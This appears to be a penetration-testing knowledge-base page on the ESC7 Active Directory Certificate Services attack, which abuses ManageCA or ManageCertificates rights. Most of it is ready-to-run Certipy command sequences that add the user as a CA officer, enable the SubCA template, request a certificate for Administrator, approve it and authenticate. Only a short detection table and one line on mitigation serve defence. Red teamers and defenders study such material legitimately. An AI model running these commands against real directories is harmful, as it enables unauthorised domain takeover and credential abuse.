---
title: "Attack #32 — ESC7 Vulnerable CA Officer Permissions"
description: "ESC7 exploits overly permissive CA permissions. If a low-privileged user has ManageCA rights on the Certificate Authority, they can grant themselves…"
category: active-directory
tags: ["active-directory", "adcs", "privilege-escalation"]
tools: ["Certipy"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Four/🟢 Attack #32 — ESC7 Vulnerable CA Officer Permissions.md"
---
# 🟢 Attack #32 — ESC7: Vulnerable CA Officer Permissions

***

## 📖 How It Works

ESC7 exploits **overly permissive CA permissions**. If a low-privileged user has **ManageCA** rights on the Certificate Authority, they can grant themselves **ManageCertificates** (Certificate Officer) rights, then approve their own failed/pending certificate requests — including requests for the SubCA template, which grants full CA-level authority.

### Two Sub-Variants

| Variant | Permission | Exploitation |
|---|---|---|
| **ESC7a** | ManageCA | Self-grant ManageCertificates → approve own requests |
| **ESC7b** | ManageCertificates | Directly approve pending/failed requests |

### Attack Flow (ESC7a — ManageCA)

```
1. Have ManageCA permission on the CA
2. Grant yourself ManageCertificates via CERTSRV.MSC or Certipy
3. Enable the SubCA template (if not already enabled)
4. Request a certificate using the SubCA template (will fail initially)
5. Use ManageCertificates to approve the failed request
6. Retrieve the issued certificate
7. Authenticate as any user
```

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **ManageCA or ManageCertificates on CA** | Check CA permissions |
| **Domain user account** | Principal with overly permissive CA rights |

***

## 💻 Full Commands

### 🔴 ESC7a — ManageCA → ManageCertificates → SubCA

```bash
# ── Step 1: Add yourself as officer (grant ManageCertificates) ────────────────
certipy ca -u low_user@corp.local -p 'Password1' -ca CORP-CA \
  -add-officer low_user -dc-ip 10.10.10.10

# ── Step 2: Enable SubCA template ────────────────────────────────────────────
certipy ca -u low_user@corp.local -p 'Password1' -ca CORP-CA \
  -enable-template SubCA -dc-ip 10.10.10.10

# ── Step 3: Request SubCA certificate (will fail — needs approval) ───────────
certipy req -u low_user@corp.local -p 'Password1' -ca CORP-CA \
  -template SubCA -upn Administrator@corp.local -dc-ip 10.10.10.10
# Note the Request ID from the output (e.g., Request ID: 42)

# ── Step 4: Approve the failed request (using ManageCertificates) ────────────
certipy ca -u low_user@corp.local -p 'Password1' -ca CORP-CA \
  -issue-request 42 -dc-ip 10.10.10.10

# ── Step 5: Retrieve the issued certificate ───────────────────────────────────
certipy req -u low_user@corp.local -p 'Password1' -ca CORP-CA \
  -retrieve 42 -dc-ip 10.10.10.10

# ── Step 6: Authenticate ──────────────────────────────────────────────────────
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

### 🔴 ESC7b — ManageCertificates Direct

```bash
# ── If you already have ManageCertificates, skip the officer step ─────────────
# Request + approve flow is the same as steps 3-6 above
certipy req -u low_user@corp.local -p 'Password1' -ca CORP-CA \
  -template SubCA -upn Administrator@corp.local -dc-ip 10.10.10.10

certipy ca -u low_user@corp.local -p 'Password1' -ca CORP-CA \
  -issue-request <ID> -dc-ip 10.10.10.10

certipy req -u low_user@corp.local -p 'Password1' -ca CORP-CA \
  -retrieve <ID> -dc-ip 10.10.10.10

certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4890** | Security Log (CA) | CA security settings changed (officer added) |
| **4886** | Security Log (CA) | Certificate request for SubCA template |
| **4887** | Security Log (CA) | Certificate issued after manual approval |

***

## 🔗 Attack Chain Context

```
[ESC7] ──→ CA permissions abuse → approve own requests → domain compromise
         │
         ├──→ 🔑 ManageCA → self-grant ManageCertificates → approve SubCA requests
         ├──→ 🔗 SubCA cert = full CA authority
         └──→ 💀 Defeated by: restrict ManageCA/ManageCertificates, audit CA permissions
```

***

> ✅ **Attack #32 — ESC7 complete.**
